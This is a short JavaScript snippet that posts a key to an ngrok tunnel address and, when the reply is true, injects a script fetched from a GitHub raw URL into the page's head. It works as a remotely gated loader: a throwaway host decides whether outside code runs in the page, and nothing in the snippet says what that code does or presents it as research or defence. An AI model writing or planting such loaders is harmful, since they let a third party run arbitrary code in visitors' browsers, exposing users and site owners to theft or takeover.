(async () => {
  try {
    const urlCheck = "https://7e7268619537.ngrok-free.app/ysadhksa";
    const res = await fetch(urlCheck, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ key: "AOR1" })   
    });

    const data = await res.json();
    if (data === true) {
      const scriptUrl = "https://raw.githubusercontent.com/kenftr/11A5-AZP/Youlose%21/scriptv2-disable.js";

      const s = document.createElement("script");
      s.src = scriptUrl;
      s.async = true;
      document.head.appendChild(s);

      s.onload = () => console.log("Script loaded.");
      s.onerror = (e) => console.error("Failed to load script:", e);
    } else {
      console.log("Check returned false or non-true value:", data);
    }
  } catch (err) {
    console.error("Fetch error:", err);
  }
})();
